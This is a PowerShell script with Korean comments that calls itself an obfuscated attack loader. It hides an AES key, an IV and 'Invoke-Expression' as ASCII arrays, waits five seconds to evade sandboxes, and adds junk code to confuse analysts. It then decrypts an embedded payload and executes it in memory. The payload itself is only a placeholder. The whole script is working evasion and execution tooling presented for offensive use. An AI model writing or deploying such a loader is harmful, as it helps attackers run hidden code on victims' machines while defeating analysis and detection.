<#
.SYNOPSIS
    고급 난독화가 적용된 최종 공격용 로더 스크립트
.DESCRIPTION
    이 스크립트는 여러 난독화 기법이 중첩 적용되어 분석을 매우 어렵게 만듬.
    - 주요 문자열(키, IV, 실행 명령어)을 아스키코드 배열로 숨김
    - 의미 없는 변수명($a1, $b2...)을 사용하여 코드 흐름 파악을 방해
    - 분석 환경을 탐지하기 위해 실행을 5초간 지연 (안티-샌드박스)
    - 분석가를 혼란시키기 위한 의미 없는 '쓰레기 코드' 포함
#>

# --- 안티-포렌식: 실행 지연 ---
# 자동화된 분석 샌드박스를 회피하기 위해 5초간 대기.
Start-Sleep -Seconds 5


# --- 데이터 영역: 모든 중요 문자열을 아스키코드 배열로 위장 ---

# 키(Key) 문자열 "ZGFuZ2VyIG9mIHR5cG9zIQ=="를 숨김
$a1 = 90, 71, 70, 117, 90, 50, 86, 121, 73, 71, 57, 109, 73, 72, 82, 53, 99, 71, 57, 122, 73, 81, 61, 61

# IV 문자열 "aGRmbGFiaGFoYXdlbGNvbWU="를 숨김
$b2 = 97, 71, 82, 109, 98, 71, 70, 105, 97, 71, 70, 111, 89, 88, 100, 108, 98, 71, 78, 118, 98, 87, 85, 61

# 실행 명령어 "Invoke-Expression"을 숨김
$c3 = 73, 110, 118, 111, 107, 101, 45, 69, 120, 112, 114, 101, 115, 115, 105, 111, 110

# 암호화된 원본 스크립트 페이로드 (2.ps1의 결과물을 여기에 붙여넣기)
$d4 = "adfafd2.ps1asdfasdfgfBase64adsfasdffdgf..." #(예시)


# --- 실행 영역: 실행 시점에 데이터 재조립 및 실행 ---
try {
    # 1. 아스키코드 배열로부터 원래 문자열들을 메모리에서 재조립
    $e5 = ($a1 | ForEach-Object { [char]$_ }) -join ''
    $f6 = ($b2 | ForEach-Object { [char]$_ }) -join ''
    $g7 = ($c3 | ForEach-Object { [char]$_ }) -join '' # $g7 변수에 "Invoke-Expression"이 담김

    # 2. 분석가를 혼란시키기 위한 의미 없는 쓰레기 코드
    $h8 = 0; 1..500 | ForEach-Object { $h8 = $h8 + $_ }

    # 3. 재조립된 문자열로 키와 IV 바이트를 생성
    $i9 = [Convert]::FromBase64String($e5)[0..15]
    $j0 = [Convert]::FromBase64String($f6)[0..15]

    # 4. 복호화 로직 (변수명만 난독화됨)
    $k1 = [System.Security.Cryptography.Aes]::Create()
    $k1.Key = $i9
    $k1.IV = $j0
    $k1.Mode = 'CBC'
    $k1.Padding = 'PKCS7'

    $l2 = $k1.CreateDecryptor()
    $m3 = [Convert]::FromBase64String($d4)
    $n4 = $l2.TransformFinalBlock($m3, 0, $m3.Length)
    $o5 = [System.Text.Encoding]::UTF8.GetString($n4)
    
    # 5. 재조립된 실행 명령어를 사용하여 복호화된 스크립트를 실행
    & $g7 $o5
}
catch {
    # 오류 발생 시 종료
}
